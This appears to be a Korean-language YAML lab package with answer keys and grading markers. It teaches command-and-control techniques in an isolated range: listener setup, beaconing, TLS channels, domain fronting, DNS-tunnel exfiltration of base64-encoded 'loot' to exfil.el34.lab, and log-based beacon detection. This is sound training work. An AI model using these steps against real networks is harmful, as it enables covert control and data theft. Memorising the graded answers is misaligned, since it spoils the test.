pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 C2 도구·리스너 포트 확보
      **실습 의미:** C2는 리스너(공격자)↔임플란트(피해자) 구조다 — 먼저 도구와 리스너 포트(55007)가 가용한지 실제 확인한다. **⚠️ 인가된 el34 실습만·self-clean.**
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # C2 도구(nc/python3/openssl/curl/dig)가 모두 있고 리스너 포트(55007)가 비어있으면 준비 마커, 사용중이면 busy
        command -v nc python3 openssl curl dig >/dev/null && (ss -lnt 2>/dev/null | grep -q :55007 && echo busy || echo c2_tools_ready)
      '
      ```
      ## ✅ 합격 기준
      `c2_tools_ready` 출력 시 통과. **근거:** 마커는 C2 도구가 모두 존재하고 리스너 포트가 비어있을 때만 찍히므로, C2를 구축할 환경이 준비됐음을 뜻한다(사용중이면 busy).
    hint: 'C2 도구'
    category: survey
    points: 10
    answer: |
      docker exec el34-attacker sh -c '
        # 도구 모두 존재 + 55007 비어있으면 준비, 사용중이면 busy
        command -v nc python3 openssl curl dig >/dev/null && (ss -lnt 2>/dev/null | grep -q :55007 && echo busy || echo c2_tools_ready)
      '
    answer_detail: "C2 도구 확인 = nc/python3/openssl/curl/dig 존재 + 리스너 포트(55007) 비어있음을 실제 점검. 마커는 둘 다 충족 시에만 출력."
    verify:
      type: output_contains
      expect: 'c2_tools_ready'
      field: stdout
      semantic: {intent: "C2 도구", success_criteria: ["도구/포트"], acceptable_methods: ["**[OSS] C2 도구 (권장)**"]}
    target_vm: web

  - order: 2
    instruction: |
      ## 🎯 C2 리스너 기동 + 접속 확인
      **실습 의미:** 리스너는 임플란트 접속을 받는 공격자측 서버다 — 실제로 HTTP 리스너를 띄우고 200 응답이 오는지 검증한다(실무 C2는 Sliver/Mythic/Cobalt Strike).
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # HTTP C2 리스너를 백그라운드로 띄우고 PID를 잡는다 (-u 언버퍼)
        python3 -u -m http.server 55007 >/tmp/c2.log 2>&1 & P=$!
        sleep 1
        # 리스너에 실제 접속해 응답코드를 받는다
        code=$(curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:55007/)
        # 리스너 종료 + 로그 정리(self-clean)
        kill $P 2>/dev/null; rm -f /tmp/c2.log
        # 실제 200 응답을 받았으면 리스너 기동 마커
        [ "$code" = "200" ] && echo listener_up_$code
      '
      ```
      ## ✅ 합격 기준
      `listener_up_200` 출력 시 통과. **근거:** 마커는 리스너가 실제 200 응답을 돌려줄 때만 찍히므로, 가짜 echo가 아니라 C2 리스너가 실제로 떠서 접속을 받았음을 뜻한다.
    hint: 'C2 리스너'
    category: manipulation
    points: 12
    answer: |
      docker exec el34-attacker sh -c '
        # HTTP 리스너 기동(PID 캡처)
        python3 -u -m http.server 55007 >/tmp/c2.log 2>&1 & P=$!
        sleep 1
        # 실제 접속 응답코드 확인
        code=$(curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:55007/)
        # 종료 + self-clean
        kill $P 2>/dev/null; rm -f /tmp/c2.log
        # 200이면 리스너 기동 마커
        [ "$code" = "200" ] && echo listener_up_$code
      '
    answer_detail: "C2 리스너 = http.server 기동 후 실제 접속(200) 검증. 마커가 200 게이트라 리스너가 죽으면 미통과."
    verify:
      type: output_contains
      expect: 'listener_up_200'
      field: stdout
      semantic: {intent: "C2 리스너", success_criteria: ["실접속 200"], acceptable_methods: ["**[OSS] http.server (권장)**"]}
    target_vm: web

  - order: 3
    instruction: |
      ## 🎯 비콘 — 주기적 체크인 (실측)
      **실습 의미:** 비콘은 임플란트가 sleep 간격마다 C2에 폴링하는 방식이다 — 실제로 3회 체크인하고 리스너 로그로 확인한다(규칙적 주기가 탐지 단서).
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # C2 리스너 기동 (-u 언버퍼로 로그 즉시 기록)
        python3 -u -m http.server 55007 >/tmp/c2.log 2>&1 & P=$!
        sleep 1
        # 임플란트가 3회 주기적으로 /tasks를 폴링한다 (비콘 체크인)
        for i in 1 2 3; do curl -s -o /dev/null "http://127.0.0.1:55007/tasks?beacon=$i"; sleep 1; done
        # 리스너 종료 후 로그에 기록된 체크인 수를 센다
        kill $P 2>/dev/null
        N=$(grep -c "GET /tasks" /tmp/c2.log); rm -f /tmp/c2.log
        # 체크인이 3회 이상 실제 기록됐으면 마커
        [ "$N" -ge 3 ] && echo beacon_checkins_$N
      '
      ```
      ## ✅ 합격 기준
      `beacon_checkins_3`(이상) 출력 시 통과. **근거:** 마커는 비콘 체크인이 리스너 로그에 실제 3회 이상 기록됐을 때만 찍히므로, 임플란트→C2 주기적 체크인이 실제로 일어났음을 뜻한다.
    hint: '비콘'
    category: analysis
    points: 14
    answer: |
      docker exec el34-attacker sh -c '
        # 리스너 기동(언버퍼)
        python3 -u -m http.server 55007 >/tmp/c2.log 2>&1 & P=$!
        sleep 1
        # 3회 비콘 폴링
        for i in 1 2 3; do curl -s -o /dev/null "http://127.0.0.1:55007/tasks?beacon=$i"; sleep 1; done
        # 로그 기록 체크인 수 집계
        kill $P 2>/dev/null
        N=$(grep -c "GET /tasks" /tmp/c2.log); rm -f /tmp/c2.log
        # 3회 이상이면 마커
        [ "$N" -ge 3 ] && echo beacon_checkins_$N
      '
    answer_detail: "비콘 = 주기적 /tasks 폴링을 실제 수행→리스너 로그 grep 카운트≥3 게이트. 실측 체크인."
    verify:
      type: output_contains
      expect: 'beacon_checkins_'
      field: stdout
      semantic: {intent: "비콘", success_criteria: ["로그 기록 체크인"], acceptable_methods: ["**[OSS] 비콘 폴링 (권장)**"]}
    target_vm: web

  - order: 4
    instruction: |
      ## 🎯 암호화 채널 (TLS C2) — 실제 핸드셰이크
      **실습 의미:** C2 트래픽을 TLS로 암호화하면 내용 검사(DPI)를 피한다 — 실제 TLS 핸드셰이크로 협상된 암호 스위트를 확인한다(방어는 메타/flow/JA3).
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # 443에 실제 TLS 핸드셰이크를 걸어 협상 결과를 받는다
        OUT=$(echo | timeout 8 openssl s_client -connect 10.20.30.1:443 -servername dvwa.el34.lab 2>/dev/null)
        # 협상된 암호 스위트·프로토콜을 표시
        echo "$OUT" | grep -iE "Cipher is|New, TLS|Protocol|Cipher " | head -3
        # 암호 스위트가 실제 협상됐으면 TLS 채널 마커
        echo "$OUT" | grep -qiE "Cipher is .+|Cipher.*(AES|GCM|CHACHA)" && echo tls_channel_ok
      '
      ```
      ## ✅ 합격 기준
      `tls_channel_ok` 출력 시 통과. **근거:** 마커는 실제 TLS 핸드셰이크에서 암호 스위트가 협상됐을 때만 찍히므로, C2가 명령을 숨길 443 암호 채널이 실제 성립함을 뜻한다.
    hint: '암호화 채널'
    category: analysis
    points: 14
    answer: |
      docker exec el34-attacker sh -c '
        # 실제 TLS 핸드셰이크
        OUT=$(echo | timeout 8 openssl s_client -connect 10.20.30.1:443 -servername dvwa.el34.lab 2>/dev/null)
        echo "$OUT" | grep -iE "Cipher is|New, TLS|Protocol|Cipher " | head -3
        # 암호 협상 성공 시 마커
        echo "$OUT" | grep -qiE "Cipher is .+|Cipher.*(AES|GCM|CHACHA)" && echo tls_channel_ok
      '
    answer_detail: "암호화 채널 = 실제 openssl TLS 핸드셰이크→협상된 cipher 확인. 마커는 암호 협상 성공 시에만(실측)."
    verify:
      type: output_contains
      expect: 'tls_channel_ok'
      field: stdout
      semantic: {intent: "암호화 채널", success_criteria: ["실TLS 협상"], acceptable_methods: ["**[OSS] openssl (권장)**"]}
    target_vm: web

  - order: 5
    instruction: |
      ## 🎯 도메인 프론팅 — SNI ≠ Host 실증
      **실습 의미:** 도메인 프론팅은 겉(연결 도메인)은 합법 CDN, 속(Host 헤더)은 C2다 — --resolve로 연결명≠Host 불일치를 만들어 방어자가 겉만 보고 C2를 놓치는 원리를 실증한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # 도메인 프론팅: 연결명(cdn-front)을 표적 IP에 매핑(--resolve)하되 Host 헤더는 dvwa로 보낸다
        code=$(curl -s -o /dev/null -w "%{http_code}" --resolve cdn-front.el34.lab:80:10.20.30.1 -H "Host: dvwa.el34.lab" http://cdn-front.el34.lab/)
        echo "겉=cdn-front.el34.lab, 속 Host=dvwa.el34.lab → 응답 $code"
        # 겉/속이 다른데도 실제 라우팅(응답≠000)되면 프론팅 마커
        [ "$code" != "000" ] && echo fronting_ok_$code
      '
      ```
      ## ✅ 합격 기준
      `fronting_ok`(과 응답코드)이 출력되면 통과. **근거:** 마커는 연결명(cdn-front)과 Host(dvwa)가 다른데도 실제 라우팅돼 응답(≠000)을 받았을 때만 찍히므로, 방어자가 겉만 보고 속(C2)을 놓치는 프론팅을 실증했음을 뜻한다.
    hint: '도메인 프론팅'
    category: analysis
    points: 12
    answer: |
      docker exec el34-attacker sh -c '
        # 연결명(cdn-front)≠Host(dvwa)로 라우팅 (--resolve)
        code=$(curl -s -o /dev/null -w "%{http_code}" --resolve cdn-front.el34.lab:80:10.20.30.1 -H "Host: dvwa.el34.lab" http://cdn-front.el34.lab/)
        echo "겉=cdn-front.el34.lab, 속 Host=dvwa.el34.lab → 응답 $code"
        # 응답≠000이면 프론팅 마커
        [ "$code" != "000" ] && echo fronting_ok_$code
      '
    answer_detail: "도메인 프론팅 = --resolve로 연결명(cdn-front)≠Host(dvwa) 실증. 응답코드 비-000 게이트. 실 CDN에선 SNI가 위장."
    verify:
      type: output_contains
      expect: 'fronting_ok'
      field: stdout
      semantic: {intent: "도메인 프론팅", success_criteria: ["SNI≠Host 라우팅"], acceptable_methods: ["**[OSS] curl --resolve (권장)**"]}
    target_vm: web

  - order: 6
    instruction: |
      ## 🎯 DNS 터널 — 데이터를 DNS 쿼리에 실어 유출
      **실습 의미:** DNS(53)는 거의 항상 열려 있다 — 데이터를 base64로 인코딩해 DNS 쿼리 라벨에 실어 실제로 내보낸다(C2가 권한 네임서버면 쿼리에서 데이터 복원).
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # 유출 데이터를 base64 DNS 라벨로 인코딩한다 (= 제거, +/→-_ 치환으로 DNS 라벨 안전화)
        D=$(echo -n "loot:user=admin" | base64 | tr -d "=" | tr "+/" "-_")
        echo "유출 쿼리: $D.exfil.el34.lab"
        # 인코딩 라벨로 DNS 쿼리를 실제 전송한다 (53 포트 악용)
        dig +short +tries=1 +time=2 "$D.exfil.el34.lab" >/dev/null 2>&1
        # 데이터가 유효 DNS 라벨로 인코딩·전송됐으면 마커
        echo "$D" | grep -qE "^[A-Za-z0-9_-]{6,}$" && echo dns_tunnel_sent
      '
      ```
      ## ✅ 합격 기준
      `dns_tunnel_sent`(과 유출 쿼리)이 출력되면 통과. **근거:** 마커는 데이터가 유효한 base64 DNS 라벨로 인코딩돼 dig로 실제 전송됐을 때만 찍히므로, DNS 쿼리를 통한 유출이 실제로 일어났음을 뜻한다.
    hint: 'DNS 터널'
    category: analysis
    points: 14
    answer: |
      docker exec el34-attacker sh -c '
        # 데이터를 base64 DNS 라벨로 인코딩
        D=$(echo -n "loot:user=admin" | base64 | tr -d "=" | tr "+/" "-_")
        echo "유출 쿼리: $D.exfil.el34.lab"
        # dig로 실제 DNS 쿼리 전송 (53 악용)
        dig +short +tries=1 +time=2 "$D.exfil.el34.lab" >/dev/null 2>&1
        # 유효 라벨로 인코딩·전송됐으면 마커
        echo "$D" | grep -qE "^[A-Za-z0-9_-]{6,}$" && echo dns_tunnel_sent
      '
    answer_detail: "DNS 터널 = 데이터를 base64 DNS 라벨로 인코딩→dig 전송. 라벨 형식 검증 게이트. 실제 DNS 쿼리 유출."
    verify:
      type: output_contains
      expect: 'dns_tunnel_sent'
      field: stdout
      semantic: {intent: "DNS 터널", success_criteria: ["DNS 라벨 유출"], acceptable_methods: ["**[OSS] dig (권장)**"]}
    target_vm: web

  - order: 7
    instruction: |
      ## 🎯 C2 비콘 탐지 (방어자 관점) — 로그 분석
      **실습 의미:** 공격자가 만든 비콘을 방어자가 잡는다 — 표적에 비콘을 흘리고 액세스 로그에서 출처/패턴을 실제 카운트한다(비콘의 약점=규칙성).
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      # 1) 공격자가 표적에 비콘 5회를 주기적으로 흘린다 (동일 경로 aa07beacon)
      docker exec el34-attacker sh -c 'for i in 1 2 3 4 5; do curl -s -o /dev/null -H "Host: dvwa.el34.lab" "http://10.20.30.1/aa07beacon"; sleep 1; done; echo "비콘 5회 전송됨"'
      # 2) 방어자가 웹 액세스 로그에서 비콘 경로 출현 횟수를 센다 (규칙적 주기·동일 경로가 단서)
      docker exec el34-web sh -c 'N=$(grep -c aa07beacon /var/log/apache2/dvwa_access.log 2>/dev/null); echo "액세스 로그 비콘 탐지: ${N:-0}회"; [ "${N:-0}" -ge 5 ] && echo c2_detected_$N'
      ```
      ## ✅ 합격 기준
      `c2_detected_5`(이상) 출력 시 통과. **근거:** 마커는 방어자가 액세스 로그에서 비콘을 실제 5회 이상 카운트했을 때만 찍히므로, 공격이 만든 흔적(규칙적 주기·동일 경로)을 방어자가 실측 탐지했음을 뜻한다.
    hint: 'C2 탐지'
